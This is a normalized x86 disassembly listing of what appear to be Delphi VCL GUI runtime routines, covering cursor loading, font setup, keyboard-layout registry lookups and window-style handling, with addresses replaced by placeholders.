pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_4653ac
pop ecx
mov eax [ esi + 0x34 ]
call sub_45a8fc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45a90c
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_4654a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d62c
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_4654c4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40348c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4654f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4654c4
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4654f4
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465570
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4654c4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4654c4
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4654f4
pop ecx
test al al
je r-xdata
sub_4655c4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40348c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4655f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4655c4
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4655f4
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465670
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4655c4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4655c4
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4655f4
pop ecx
test al al
je r-xdata
sub_4656c4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_418310
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_454f44
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_465718
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_4656c4
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_40348c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465794
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420ea4
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_4657d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_448fd8
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_449ca8
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_465818
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call RedrawWindow
sub_46596c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_46071c
mov dl 0x5
mov eax ebx
call sub_462490
mov dl 0x1
mov eax ebx
call sub_44deb8
mov dl 0x3
mov eax ebx
call sub_46278c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4659d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_465aab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44dd78
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44dbe4
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_448008
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_448a68
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4040f8
mov eax [ ebp - 0xc ]
call sub_4042c8
push eax
mov eax [ ebp - 0xc ]
call sub_4044c8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_448a78
mov eax [ ebp - 0xc ]
call sub_4042c8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ab2
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov dl 0x1
mov eax esi
call sub_461b10
mov edx [ ebp - 0xc ]
mov eax esi
call sub_448b24
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404654
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_465ad8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44c00c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_461234
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44bfd0
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40348c
inc ebp
dec edi
jne r-xdata
sub_465b24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44dd78
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_465b50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e580
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_465b78
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_463ee0
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44dd78
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44f2dc
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44dd8c
or ecx 0xffffffff
mov dl 0x1
call sub_44919c
pop esi
pop ebx
retn
sub_465c10
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44e9f0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_449ca8
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_448494
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40348c
sub_465c68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_465d2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_448a68
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4040f8
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_448a78
mov eax [ ebp - 0x4 ]
call sub_4042c8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_448b24
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465d35
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_461b10
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404654
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_465d54
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44e770
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44dd78
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44dd8c
mov dl [ ebx + 0x57 ]
call sub_448a14
inc edi
dec esi
jne r-xdata
sub_465df8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_465e28
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_465e58
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4661fc
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_466208
mov eax ebx
call sub_466214
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_462630
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423614
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_466634
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_466510
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_466510
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_466510
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_465fb0
push ebx
push esi
push edi
push ebp
call sub_403644
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403290
mov eax [ ebp + 0x88 ]
call sub_403290
mov eax [ ebp + 0x84 ]
call sub_403290
mov eax [ ebp + 0x54 ]
call sub_403290
mov eax [ ebp + 0x50 ]
call sub_403290
mov eax [ ebp + 0x4c ]
call sub_403290
mov eax [ ebp + 0x30 ]
call sub_403290
mov eax [ ebp + 0x34 ]
call sub_403290
mov eax [ ebp + 0x7c ]
call sub_403290
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403290
mov eax ebp
call sub_466270
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420760
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40362c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_418310
call sub_403290
inc edi
dec esi
jne r-xdata
sub_466128
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_466174
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4181b4
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4181b4
mov eax [ rw-data ]
call sub_468f00
sub_4661ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4184ac
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4184ac
mov eax [ rw-data ]
call sub_468f00
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_4508b4
sub_466214
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4662cc
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_466270
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026ec
mov ebx esi
test ebx ebx
jne r-xdata
sub_4662cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_4662f4
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46649f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4664a6
lea eax [ ebp - 0x260 ]
call sub_404008
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404008
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41a7b0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408c80
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_454018
test al al
je r-xdata
xor eax eax
push ebp
push sub_46645b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404278
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404278
sub_466510
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_468d70
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_468b24
mov dl 0x1
mov eax [ rw-data ]
call sub_468b24
sub_46657c
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_4665a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46657c
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406b60
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406ae8
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_466634
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_466779
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_468b24
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4239a4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4239a4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423a88
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4239a4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_4239a4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4239a4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_468b24
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4237e8
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4237e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466780
cmp [ rw-data ] 0x0
je r-xdata
sub_4667b8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
